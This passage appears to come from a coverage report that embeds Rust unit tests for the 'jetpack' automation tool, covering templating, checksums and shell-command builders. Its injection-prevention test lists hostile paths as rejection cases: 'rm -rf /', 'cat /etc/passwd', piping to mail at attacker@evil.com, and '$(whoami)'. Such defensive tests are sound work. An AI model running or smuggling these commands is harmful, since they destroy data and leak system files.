new_handlebars();\n    \n    // Test isdefined with two parameters (should fail)\n    let result = handlebars.render_template(\n        r#\"{{isdefined a b}}\"#,\n        \u0026json!({\"a\": 1, \"b\": 2})\n    );\n    assert!(result.is_err());\n    assert!(result.unwrap_err().to_string().contains(\"requires one parameter\"));\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","playbooks","templar.rs"],"content":"use jetpack::playbooks::templar::*;\nuse serde_yaml;\n\n#[test]\nfn test_templar_new() {\n    let templar = Templar::new();\n    // Just ensure we can create a new instance\n    assert!(true);\n}\n\n#[test]\nfn test_template_mode_equality() {\n    assert_eq!(TemplateMode::Strict, TemplateMode::Strict);\n    assert_eq!(TemplateMode::Off, TemplateMode::Off);\n    assert_ne!(TemplateMode::Strict, TemplateMode::Off);\n}\n\n#[test]\nfn test_render_simple_template() {\n    let templar = Templar::new();\n    let mut data = serde_yaml::Mapping::new();\n    data.insert(serde_yaml::Value::String(\"name\".to_string()), serde_yaml::Value::String(\"world\".to_string()));\n    \n    let template = \"Hello, {{name}}!\".to_string();\n    let result = templar.render(\u0026template, data, TemplateMode::Strict);\n    \n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"Hello, world!\");\n}\n\n#[test]\nfn test_render_template_with_missing_variable() {\n    let templar = Templar::new();\n    let data = serde_yaml::Mapping::new();\n    \n    let template = \"Hello, {{name}}!\".to_string();\n    let result = templar.render(\u0026template, data, TemplateMode::Strict);\n    \n    assert!(result.is_err());\n    assert!(result.unwrap_err().contains(\"Template error\"));\n}\n\n#[test]\nfn test_render_off_mode() {\n    let templar = Templar::new();\n    let data = serde_yaml::Mapping::new();\n    \n    let template = \"Hello, {{name}}!\".to_string();\n    let result = templar.render(\u0026template, data, TemplateMode::Off);\n    \n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"empty\");\n}\n\n#[test]\nfn test_test_condition_true() {\n    let templar = Templar::new();\n    let mut data = serde_yaml::Mapping::new();\n    data.insert(serde_yaml::Value::String(\"value\".to_string()), serde_yaml::Value::Number(serde_yaml::Number::from(10)));\n    \n    let expr = \"value\".to_string(); // Simple truthiness test\n    let result = templar.test_condition(\u0026expr, data, TemplateMode::Strict);\n    \n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), true);\n}\n\n#[test]\nfn test_test_condition_false() {\n    let templar = Templar::new();\n    let mut data = serde_yaml::Mapping::new();\n    data.insert(serde_yaml::Value::String(\"value\".to_string()), serde_yaml::Value::Bool(false));\n    \n    let expr = \"value\".to_string();\n    let result = templar.test_condition(\u0026expr, data, TemplateMode::Strict);\n    \n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), false);\n}\n\n#[test]\nfn test_test_condition_off_mode() {\n    let templar = Templar::new();\n    let data = serde_yaml::Mapping::new();\n    \n    let expr = \"value \u003e 5\".to_string();\n    let result = templar.test_condition(\u0026expr, data, TemplateMode::Off);\n    \n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), true); // Always returns true in Off mode\n}\n\n#[test]\nfn test_test_condition_with_undefined_parameter() {\n    let templar = Templar::new();\n    let data = serde_yaml::Mapping::new();\n    \n    let expr = \"undefined_var == true\".to_string();\n    let result = templar.test_condition(\u0026expr, data, TemplateMode::Strict);\n    \n    assert!(result.is_err());\n    let err = result.unwrap_err();\n    assert!(err.contains(\"failed to parse conditional\"));\n}\n\n#[test]\nfn test_test_condition_with_complex_expression() {\n    let templar = Templar::new();\n    let mut data = serde_yaml::Mapping::new();\n    data.insert(serde_yaml::Value::String(\"show\".to_string()), serde_yaml::Value::Bool(true));\n    data.insert(serde_yaml::Value::String(\"hide\".to_string()), serde_yaml::Value::Bool(false));\n    \n    let expr = \"show\".to_string(); // Simplified\n    let result = templar.test_condition(\u0026expr, data, TemplateMode::Strict);\n    \n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), true);\n}\n\n#[test]\nfn test_render_with_helpers() {\n    let templar = Templar::new();\n    let mut data = serde_yaml::Mapping::new();\n    data.insert(serde_yaml::Value::String(\"text\".to_string()), serde_yaml::Value::String(\"HELLO\".to_string()));\n    \n    let template = \"{{ to_lower_case text }}\".to_string();\n    let result = templar.render(\u0026template, data, TemplateMode::Strict);\n    \n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"hello\");\n}\n\n#[test]\nfn test_render_with_if_block() {\n    let templar = Templar::new();\n    let mut data = serde_yaml::Mapping::new();\n    data.insert(serde_yaml::Value::String(\"show\".to_string()), serde_yaml::Value::Bool(true));\n    \n    let template = \"{{#if show}}visible{{else}}hidden{{/if}}\".to_string();\n    let result = templar.render(\u0026template, data, TemplateMode::Strict);\n    \n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"visible\");\n}\n\n#[test]\nfn test_template_mode_debug() {\n    // Test Debug trait implementation\n    let mode = TemplateMode::Strict;\n    let debug_str = format!(\"{:?}\", mode);\n    assert_eq!(debug_str, \"Strict\");\n    \n    let mode = TemplateMode::Off;\n    let debug_str = format!(\"{:?}\", mode);\n    assert_eq!(debug_str, \"Off\");\n}\n\n#[test]\nfn test_template_mode_copy() {\n    // Test Copy trait implementation\n    let mode1 = TemplateMode::Strict;\n    let mode2 = mode1; // Copy\n    assert_eq!(mode1, mode2);\n}\n\n#[test]\nfn test_template_mode_clone() {\n    // Test Clone trait implementation\n    let mode1 = TemplateMode::Strict;\n    let mode2 = mode1.clone();\n    assert_eq!(mode1, mode2);\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","registry","list.rs"],"content":"","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","registry","mod.rs"],"content":"mod list;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","tasks","checksum.rs"],"content":"use jetpack::tasks::checksum::*;\n\n#[test]\nfn test_sha512_empty_string() {\n    let result = sha512(\u0026\"\".to_string());\n    // SHA-512 of empty string\n    assert_eq!(result, \"cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e\");\n}\n\n#[test]\nfn test_sha512_hello_world() {\n    let result = sha512(\u0026\"Hello World\".to_string());\n    // SHA-512 of \"Hello World\"\n    assert_eq!(result, \"2c74fd17edafd80e8447b0d46741ee243b7eb74dd2149a0ab1b9246fb30382f27e853d8585719e0e67cbda0daa8f51671064615d645ae27acb15bfb1447f459b\");\n}\n\n#[test]\nfn test_sha512_with_newline() {\n    let result = sha512(\u0026\"test\\n\".to_string());\n    assert_eq!(result.len(), 128); // SHA-512 produces 128 hex characters\n}\n\n#[test]\nfn test_sha512_unicode() {\n    let result = sha512(\u0026\"Hello 世界\".to_string());\n    assert_eq!(result.len(), 128);\n    // Different from ASCII-only string\n    assert_ne!(result, sha512(\u0026\"Hello World\".to_string()));\n}\n\n#[test]\nfn test_sha512_deterministic() {\n    let input = \"Deterministic test\".to_string();\n    let result1 = sha512(\u0026input);\n    let result2 = sha512(\u0026input);\n    assert_eq!(result1, result2);\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","tasks","cmd_library.rs"],"content":"use jetpack::tasks::cmd_library::*;\nuse jetpack::inventory::hosts::HostOSType;\nuse jetpack::tasks::files::Recurse;\n\n#[test]\nfn test_screen_path_valid() {\n    let path = \"/home/user/file.txt\".to_string();\n    let result = screen_path(\u0026path);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"/home/user/file.txt\");\n}\n\n#[test]\nfn test_screen_path_with_spaces() {\n    let path = \"/home/user/my file.txt\".to_string();\n    let result = screen_path(\u0026path);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"/home/user/my file.txt\");\n}\n\n#[test]\nfn test_screen_path_with_special_chars() {\n    let path = \"/home/user/file;rm -rf /\".to_string();\n    let result = screen_path(\u0026path);\n    assert!(result.is_err());\n}\n\n#[test]\nfn test_screen_general_input_strict_valid() {\n    let input = \"simple-text_123\".to_string();\n    let result = screen_general_input_strict(\u0026input);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"simple-text_123\");\n}\n\n#[test]\nfn test_screen_general_input_strict_invalid_chars() {\n    let invalid_chars = vec![\";\", \"{\", \"}\", \"(\", \")\", \"\u003c\", \"\u003e\", \"\u0026\", \"*\", \"|\", \"=\", \"?\", \"[\", \"]\", \"$\", \"%\", \"`\"];\n    \n    for ch in invalid_chars {\n        let input = format!(\"test{}input\", ch);\n        let result = screen_general_input_strict(\u0026input);\n        assert!(result.is_err());\n        assert!(result.unwrap_err().contains(\"illegal characters found\"));\n    }\n}\n\n#[test]\nfn test_screen_general_input_loose_valid() {\n    let input = \"simple-text_123=value\".to_string();\n    let result = screen_general_input_loose(\u0026input);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"simple-text_123=value\");\n}\n\n#[test]\nfn test_screen_general_input_loose_allows_equals() {\n    let input = \"key=value\".to_string();\n    let result = screen_general_input_loose(\u0026input);\n    assert!(result.is_ok());\n}\n\n#[test]\nfn test_screen_general_input_loose_invalid_chars() {\n    let invalid_chars = vec![\";\", \"\u003c\", \"\u003e\", \"\u0026\", \"*\", \"?\", \"{\", \"}\", \"[\", \"]\", \"$\", \"`\"];\n    \n    for ch in invalid_chars {\n        let input = format!(\"test{}input\", ch);\n        let result = screen_general_input_loose(\u0026input);\n        assert!(result.is_err());\n        assert!(result.unwrap_err().contains(\"illegal characters detected\"));\n    }\n}\n\n#[test]\nfn test_screen_mode_valid_octal() {\n    let valid_modes = vec![\"755\", \"644\", \"777\", \"000\", \"400\", \"0o755\", \"0o644\", \"12345\"];\n    \n    for mode in valid_modes {\n        let result = screen_mode(\u0026mode.to_string());\n        assert!(result.is_ok());\n        assert_eq!(result.unwrap(), mode);\n    }\n}\n\n#[test]\nfn test_screen_mode_invalid() {\n    let invalid_modes = vec![\"abc\", \"999\", \"888\", \"7.5\", \"0o999\", \"0o888\", \"755x\", \"75.5\", \"x755\"];\n    \n    for mode in invalid_modes {\n        let result = screen_mode(\u0026mode.to_string());\n        assert!(result.is_err(), \"Mode '{}' should be invalid\", mode);\n        assert!(result.unwrap_err().contains(\"not an octal string\"));\n    }\n}\n\n\n#[test]\nfn test_get_mode_command_linux() {\n    let path = \"/test/file\".to_string();\n    let result = get_mode_command(HostOSType::Linux, \u0026path);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"stat --format '%a' '/test/file'\");\n}\n\n#[test]\nfn test_get_mode_command_macos() {\n    let path = \"/test/file\".to_string();\n    let result = get_mode_command(HostOSType::MacOS, \u0026path);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"stat -f '%A' '/test/file'\");\n}\n\n#[test]\nfn test_get_sha512_command_linux() {\n    let path = \"/test/file\".to_string();\n    let result = get_sha512_command(HostOSType::Linux, \u0026path);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"sha512sum '/test/file'\");\n}\n\n#[test]\nfn test_get_sha512_command_macos() {\n    let path = \"/test/file\".to_string();\n    let result = get_sha512_command(HostOSType::MacOS, \u0026path);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"shasum -b -a 512 '/test/file'\");\n}\n\n#[test]\nfn test_get_ownership_command() {\n    let path = \"/test/file\".to_string();\n    let result = get_ownership_command(HostOSType::Linux, \u0026path);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"ls -ld '/test/file'\");\n}\n\n#[test]\nfn test_get_is_directory_command() {\n    let path = \"/test/dir\".to_string();\n    let result = get_is_directory_command(HostOSType::Linux, \u0026path);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"ls -ld '/test/dir'\");\n}\n\n#[test]\nfn test_get_touch_command() {\n    let path = \"/test/file\".to_string();\n    let result = get_touch_command(HostOSType::Linux, \u0026path);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"touch '/test/file'\");\n}\n\n#[test]\nfn test_get_create_directory_command() {\n    let path = \"/test/dir\".to_string();\n    let result = get_create_directory_command(HostOSType::Linux, \u0026path);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"mkdir -p '/test/dir'\");\n}\n\n#[test]\nfn test_get_delete_file_command() {\n    let path = \"/test/file\".to_string();\n    let result = get_delete_file_command(HostOSType::Linux, \u0026path);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"rm -f '/test/file'\");\n}\n\n#[test]\nfn test_get_delete_directory_command_no_recurse() {\n    let path = \"/test/dir\".to_string();\n    let result = get_delete_directory_command(HostOSType::Linux, \u0026path, Recurse::No);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"rmdir '/test/dir'\");\n}\n\n#[test]\nfn test_get_delete_directory_command_recurse() {\n    let path = \"/test/dir\".to_string();\n    let result = get_delete_directory_command(HostOSType::Linux, \u0026path, Recurse::Yes);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"rm -rf '/test/dir'\");\n}\n\n#[test]\nfn test_set_owner_command_no_recurse() {\n    let path = \"/test/file\".to_string();\n    let owner = \"user\".to_string();\n    let result = set_owner_command(HostOSType::Linux, \u0026path, \u0026owner, Recurse::No);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"chown 'user' '/test/file'\");\n}\n\n#[test]\nfn test_set_owner_command_recurse() {\n    let path = \"/test/dir\".to_string();\n    let owner = \"user\".to_string();\n    let result = set_owner_command(HostOSType::Linux, \u0026path, \u0026owner, Recurse::Yes);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"chown -R 'user' '/test/dir'\");\n}\n\n#[test]\nfn test_set_group_command_no_recurse() {\n    let path = \"/test/file\".to_string();\n    let group = \"group\".to_string();\n    let result = set_group_command(HostOSType::Linux, \u0026path, \u0026group, Recurse::No);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"chgrp 'group' '/test/file'\");\n}\n\n#[test]\nfn test_set_group_command_recurse() {\n    let path = \"/test/dir\".to_string();\n    let group = \"group\".to_string();\n    let result = set_group_command(HostOSType::Linux, \u0026path, \u0026group, Recurse::Yes);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"chgrp -R 'group' '/test/dir'\");\n}\n\n#[test]\nfn test_set_mode_command_no_recurse() {\n    let path = \"/test/file\".to_string();\n    let mode = \"755\".to_string();\n    let result = set_mode_command(HostOSType::Linux, \u0026path, \u0026mode, Recurse::No);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"chmod '755' '/test/file'\");\n}\n\n#[test]\nfn test_set_mode_command_recurse() {\n    let path = \"/test/dir\".to_string();\n    let mode = \"755\".to_string();\n    let result = set_mode_command(HostOSType::Linux, \u0026path, \u0026mode, Recurse::Yes);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"chmod -R '755' '/test/dir'\");\n}\n\n#[test]\nfn test_get_arch_command() {\n    let result = get_arch_command(HostOSType::Linux);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"uname -m\");\n    \n    let result = get_arch_command(HostOSType::MacOS);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"uname -m\");\n}\n\n#[test]\nfn test_command_injection_prevention() {\n    // Test various command injection attempts\n    let evil_paths = vec![\n        \"/test; rm -rf /\",\n        \"/test \u0026\u0026 cat /etc/passwd\",\n        \"/test | mail attacker@evil.com\",\n        \"/test`whoami`\",\n        \"/test$(whoami)\",\n        \"/test \u003e /dev/null; echo hacked\",\n    ];\n    \n    for evil_path in evil_paths {\n        let result = screen_path(\u0026evil_path.to_string());\n        assert!(result.is_err(), \"Should reject path: {}\", evil_path);\n    }\n}\n\n#[test]\nfn test_trimmed_inputs() {\n    let path = \"  /test/file  \".to_string();\n    let result = screen_path(\u0026path);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"/test/file\");\n    \n    let input = \"  simple-text  \".to_string();\n    let result = screen_general_input_strict(\u0026input);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), \"simple-text\");\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","tasks","common.rs"],"content":"use jetpack::tasks::common::*;\nuse jetpack::tasks::request::TaskRequest;\nuse jetpack::tasks::response::TaskResponse;\nuse jetpack::tasks::logic::{PreLogicInput, PreLogicEvaluated, PostLogicEvaluated};\nuse jetpack::handle::handle::TaskHandle;\nuse jetpack::playbooks::templar::TemplateMode;\nuse std::sync::Arc;\n\n// Mock implementation of IsTask for testing\nstruct MockTask {\n    module: String,\n    name: Option\u003cString\u003e,\n}\n\nimpl IsTask for MockTask {\n    fn get_module(\u0026self) -\u003e String {\n        self.module.clone()\n    }\n\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e {\n        self.name.clone()\n    }\n\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e {\n        None\n    }\n\n    fn evaluate(\u0026self, _handle: \u0026Arc\u003cTaskHandle\u003e, _request: \u0026Arc\u003cTaskRequest\u003e, _tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        unimplemented!(\"Mock evaluation not implemented\")\n    }\n}\n\n#[test]\nfn test_get_display_name_with_name() {\n    let task = MockTask {\n        module: \"test_module\".to_string(),\n        name: Some(\"Test Task\".to_string()),\n    };\n\n    assert_eq!(task.get_display_name(), \"Test Task\");\n}\n\n#[test]\nfn test_get_display_name_without_name() {\n    let task = MockTask {\n        module: \"test_module\".to_string(),\n        name: None,\n    };\n\n    assert_eq!(task.get_display_name(), \"test_module\");\n}\n\n#[test]\nfn test_get_display_name_empty_name() {\n    let task = MockTask {\n        module: \"test_module\".to_string(),\n        name: Some(\"\".to_string()),\n    };\n\n    assert_eq!(task.get_display_name(), \"\");\n}\n\n#[test]\nfn test_evaluated_task_struct() {\n    // Mock implementation of IsAction\n    struct MockAction;\n    \n    impl IsAction for MockAction {\n        fn dispatch(\u0026self, _handle: \u0026Arc\u003cTaskHandle\u003e, _request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n            unimplemented!(\"Mock dispatch not implemented\")\n        }\n    }\n    \n    let evaluated = EvaluatedTask {\n        action: Arc::new(MockAction),\n        with: Arc::new(None),\n        and: Arc::new(None),\n    };\n    \n    assert!(evaluated.with.is_none());\n    assert!(evaluated.and.is_none());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","tasks","fields.rs"],"content":"use jetpack::tasks::fields::Field;\nuse std::collections::HashSet;\n\n#[test]\nfn test_field_equality() {\n    assert_eq!(Field::Branch, Field::Branch);\n    assert_ne!(Field::Branch, Field::Content);\n    assert_ne!(Field::Owner, Field::Group);\n}\n\n#[test]\nfn test_field_clone() {\n    let field1 = Field::Mode;\n    let field2 = field1.clone();\n    assert_eq!(field1, field2);\n}\n\n#[test]\nfn test_field_debug() {\n    let field = Field::Version;\n    let debug_str = format!(\"{:?}\", field);\n    assert_eq!(debug_str, \"Version\");\n}\n\n#[test]\nfn test_all_file_attributes() {\n    let attrs = Field::all_file_attributes();\n    assert_eq!(attrs.len(), 3);\n    assert!(attrs.contains(\u0026Field::Owner));\n    assert!(attrs.contains(\u0026Field::Group));\n    assert!(attrs.contains(\u0026Field::Mode));\n    \n    // Verify order\n    assert_eq!(attrs[0], Field::Owner);\n    assert_eq!(attrs[1], Field::Group);\n    assert_eq!(attrs[2], Field::Mode);\n}\n\n#[test]\nfn test_field_hash() {\n    let mut set = HashSet::new();\n    set.insert(Field::Branch);\n    set.insert(Field::Content);\n    set.insert(Field::Branch); // Duplicate should not increase size\n    \n    assert_eq!(set.len(), 2);\n    assert!(set.contains(\u0026Field::Branch));\n    assert!(set.contains(\u0026Field::Content));\n}\n\n#[test]\nfn test_all_field_variants() {\n    // Test that we can create each variant\n    let fields = vec![\n        Field::Branch,\n        Field::Content,\n        Field::Disable,\n        Field::Enable,\n        Field::Gecos,\n        Field::Gid,\n        Field::Group,\n        Field::Groups,\n        Field::Mode,\n        Field::Owner,\n        Field::Restart,\n        Field::Shell,\n        Field::Start,\n        Field::Stop,\n        Field::Uid,\n        Field::Users,\n        Field::Version,\n    ];\n    \n    // Ensure all are unique\n    let unique_fields: HashSet\u003c_\u003e = fields.iter().collect();\n    assert_eq!(unique_fields.len(), fields.len());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","tasks","files.rs"],"content":"use jetpack::tasks::files::*;\n\n#[test]\nfn test_recurse_enum() {\n    assert_eq!(Recurse::Yes, Recurse::Yes);\n    assert_eq!(Recurse::No, Recurse::No);\n    assert_ne!(Recurse::Yes, Recurse::No);\n}\n\n#[test]\nfn test_recurse_debug() {\n    let r = Recurse::Yes;\n    assert_eq!(format!(\"{:?}\", r), \"Yes\");\n    \n    let r = Recurse::No;\n    assert_eq!(format!(\"{:?}\", r), \"No\");\n}\n\n#[test]\nfn test_recurse_copy() {\n    let r1 = Recurse::Yes;\n    let r2 = r1; // Copy\n    assert_eq!(r1, r2);\n}\n\n#[test]\nfn test_recurse_clone() {\n    let r1 = Recurse::Yes;\n    let r2 = r1.clone();\n    assert_eq!(r1, r2);\n}\n\n#[test]\nfn test_file_attributes_input_is_octal_string() {\n    // Valid octal strings\n    assert!(FileAttributesInput::is_octal_string(\u0026\"755\".to_string()));\n    assert!(FileAttributesInput::is_octal_string(\u0026\"644\".to_string()));\n    assert!(FileAttributesInput::is_octal_string(\u0026\"000\".to_string()));\n    assert!(FileAttributesInput::is_octal_string(\u0026\"777\".to_string()));\n    assert!(FileAttributesInput::is_octal_string(\u0026\"0o755\".to_string()));\n    assert!(FileAttributesInput::is_octal_string(\u0026\"0o644\".to_string()));\n    \n    // Invalid octal strings\n    assert!(!FileAttributesInput::is_octal_string(\u0026\"999\".to_string()));\n    assert!(!FileAttributesInput::is_octal_string(\u0026\"888\".to_string()));\n    assert!(!FileAttributesInput::is_octal_string(\u0026\"abc\".to_string()));\n    assert!(!FileAttributesInput::is_octal_string(\u0026\"12x\".to_string()));\n    assert!(!FileAttributesInput::is_octal_string(\u0026\"0o999\".to_string()));\n    assert!(!FileAttributesInput::is_octal_string(\u0026\"0o888\".to_string()));\n}\n\n#[test]\nfn test_file_attributes_input_debug() {\n    let attr = FileAttributesInput {\n        owner: Some(\"user\".to_string()),\n        group: Some(\"group\".to_string()),\n        mode: Some(\"0o755\".to_string()),\n    };\n    \n    let debug_str = format!(\"{:?}\", attr);\n    assert!(debug_str.contains(\"owner\"));\n    assert!(debug_str.contains(\"group\"));\n    assert!(debug_str.contains(\"mode\"));\n}\n\n#[test]\nfn test_file_attributes_evaluated_debug() {\n    let attr = FileAttributesEvaluated {\n        owner: Some(\"user\".to_string()),\n        group: Some(\"group\".to_string()),\n        mode: Some(\"0o755\".to_string()),\n    };\n    \n    let debug_str = format!(\"{:?}\", attr);\n    assert!(debug_str.contains(\"owner\"));\n    assert!(debug_str.contains(\"group\"));\n    assert!(debug_str.contains(\"mode\"));\n}\n\n#[test]\nfn test_file_attributes_with_none_values() {\n    let attr = FileAttributesInput {\n        owner: None,\n        group: None,\n        mode: None,\n    };\n    \n    assert!(attr.owner.is_none());\n    assert!(attr.group.is_none());\n    assert!(attr.mode.is_none());\n}\n\n#[test]\nfn test_is_octal_string_edge_cases() {\n    // Empty string\n    assert!(!FileAttributesInput::is_octal_string(\u0026\"\".to_string()));\n    \n    // Just the prefix\n    assert!(!FileAttributesInput::is_octal_string(\u0026\"0o\".to_string()));\n    \n    // Very long valid octal\n    assert!(FileAttributesInput::is_octal_string(\u0026\"12345670\".to_string()));\n    \n    // Negative numbers - from_str_radix accepts them\n    assert!(FileAttributesInput::is_octal_string(\u0026\"-755\".to_string()));\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","tasks","logic.rs"],"content":"use jetpack::tasks::logic::*;\n\n#[test]\nfn test_empty_items_vector() {\n    let empty = empty_items_vector();\n    assert_eq!(empty.len(), 1);\n    assert_eq!(empty[0], serde_yaml::Value::Bool(true));\n}\n\n#[test]\nfn test_items_input_enum() {\n    // Test ItemsString variant\n    let items_str = ItemsInput::ItemsString(\"my_var\".to_string());\n    match items_str {\n        ItemsInput::ItemsString(s) =\u003e assert_eq!(s, \"my_var\"),\n        _ =\u003e panic!(\"Expected ItemsString\"),\n    }\n    \n    // Test ItemsList variant\n    let items_list = ItemsInput::ItemsList(vec![\"a\".to_string(), \"b\".to_string()]);\n    match items_list {\n        ItemsInput::ItemsList(l) =\u003e assert_eq!(l.len(), 2),\n        _ =\u003e panic!(\"Expected ItemsList\"),\n    }\n}\n\n#[test]\nfn test_pre_logic_input_struct() {\n    let pre_logic = PreLogicInput {\n        condition: Some(\"test_condition\".to_string()),\n        subscribe: Some(\"test_event\".to_string()), \n        sudo: Some(\"root\".to_string()),\n        items: Some(ItemsInput::ItemsList(vec![\"item1\".to_string()])),\n        tags: Some(vec![\"tag1\".to_string()]),\n        delegate_to: Some(\"host1\".to_string()),\n    };\n    \n    assert_eq!(pre_logic.condition, Some(\"test_condition\".to_string()));\n    assert_eq!(pre_logic.subscribe, Some(\"test_event\".to_string()));\n    assert_eq!(pre_logic.sudo, Some(\"root\".to_string()));\n    assert!(matches!(pre_logic.items, Some(ItemsInput::ItemsList(_))));\n    assert_eq!(pre_logic.tags, Some(vec![\"tag1\".to_string()]));\n    assert_eq!(pre_logic.delegate_to, Some(\"host1\".to_string()));\n}\n\n#[test]\nfn test_post_logic_input_struct() {\n    let post_logic = PostLogicInput {\n        notify: Some(\"handler\".to_string()),\n        ignore_errors: Some(\"true\".to_string()),\n        retry: Some(\"3\".to_string()),\n        delay: Some(\"5\".to_string()),\n    };\n    \n    assert_eq!(post_logic.notify, Some(\"handler\".to_string()));\n    assert_eq!(post_logic.ignore_errors, Some(\"true\".to_string()));\n    assert_eq!(post_logic.retry, Some(\"3\".to_string()));\n    assert_eq!(post_logic.delay, Some(\"5\".to_string()));\n}\n\n#[test]\nfn test_pre_logic_evaluated_struct() {\n    let evaluated = PreLogicEvaluated {\n        condition: Some(\"evaluated_condition\".to_string()),\n        subscribe: Some(\"evaluated_event\".to_string()),\n        sudo: Some(\"evaluated_user\".to_string()),\n        items: Some(ItemsInput::ItemsString(\"items_var\".to_string())),\n        tags: Some(vec![\"tag1\".to_string(), \"tag2\".to_string()]),\n    };\n    \n    assert_eq!(evaluated.condition, Some(\"evaluated_condition\".to_string()));\n    assert_eq!(evaluated.subscribe, Some(\"evaluated_event\".to_string()));\n    assert_eq!(evaluated.sudo, Some(\"evaluated_user\".to_string()));\n    assert!(matches!(evaluated.items, Some(ItemsInput::ItemsString(_))));\n    assert_eq!(evaluated.tags, Some(vec![\"tag1\".to_string(), \"tag2\".to_string()]));\n}\n\n#[test]\nfn test_post_logic_evaluated_struct() {\n    let evaluated = PostLogicEvaluated {\n        notify: Some(\"handler_name\".to_string()),\n        ignore_errors: true,\n        retry: 3,\n        delay: 5,\n    };\n    \n    assert_eq!(evaluated.notify, Some(\"handler_name\".to_string()));\n    assert_eq!(evaluated.ignore_errors, true);\n    assert_eq!(evaluated.retry, 3);\n    assert_eq!(evaluated.delay, 5);\n}\n\n#[test]\nfn test_post_logic_evaluated_defaults() {\n    let evaluated = PostLogicEvaluated {\n        notify: None,\n        ignore_errors: false,\n        retry: 0,\n        delay: 1,\n    };\n    \n    assert_eq!(evaluated.notify, None);\n    assert_eq!(evaluated.ignore_errors, false);\n    assert_eq!(evaluated.retry, 0);\n    assert_eq!(evaluated.delay, 1);\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","tasks","mod.rs"],"content":"mod fields;\nmod logic;\nmod request;\nmod common;\nmod checksum;\nmod cmd_library;\nmod files;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","tasks","request.rs"],"content":"use jetpack::tasks::request::*;\nuse jetpack::tasks::fields::Field;\n\n#[test]\nfn test_task_request_type_equality() {\n    assert_eq!(TaskRequestType::Validate, TaskRequestType::Validate);\n    assert_ne!(TaskRequestType::Query, TaskRequestType::Create);\n    assert_ne!(TaskRequestType::Remove, TaskRequestType::Modify);\n}\n\n#[test]\nfn test_sudo_details_creation() {\n    let sudo_details = SudoDetails {\n        user: Some(\"root\".to_string()),\n        template: \"sudo -u {{ user }}\".to_string(),\n    };\n    \n    assert_eq!(sudo_details.user, Some(\"root\".to_string()));\n    assert_eq!(sudo_details.template, \"sudo -u {{ user }}\");\n}\n\n#[test]\nfn test_sudo_details_clone() {\n    let sudo_details = SudoDetails {\n        user: Some(\"admin\".to_string()),\n        template: \"sudo template\".to_string(),\n    };\n    \n    let cloned = sudo_details.clone();\n    assert_eq!(cloned.user, sudo_details.user);\n    assert_eq!(cloned.template, sudo_details.template);\n}\n\n#[test]\nfn test_validate_request() {\n    let request = TaskRequest::validate();\n    assert_eq!(request.request_type, TaskRequestType::Validate);\n    assert!(request.changes.is_empty());\n    assert!(request.sudo_details.is_none());\n}\n\n#[test]\nfn test_query_request() {\n    let sudo_details = SudoDetails {\n        user: Some(\"user1\".to_string()),\n        template: \"sudo -u {{ user }}\".to_string(),\n    };\n    \n    let request = TaskRequest::query(\u0026sudo_details);\n    assert_eq!(request.request_type, TaskRequestType::Query);\n    assert!(request.changes.is_empty());\n    assert!(request.sudo_details.is_some());\n    \n    let sudo = request.sudo_details.as_ref().unwrap();\n    assert_eq!(sudo.user, Some(\"user1\".to_string()));\n    assert_eq!(sudo.template, \"sudo -u {{ user }}\");\n}\n\n#[test]\nfn 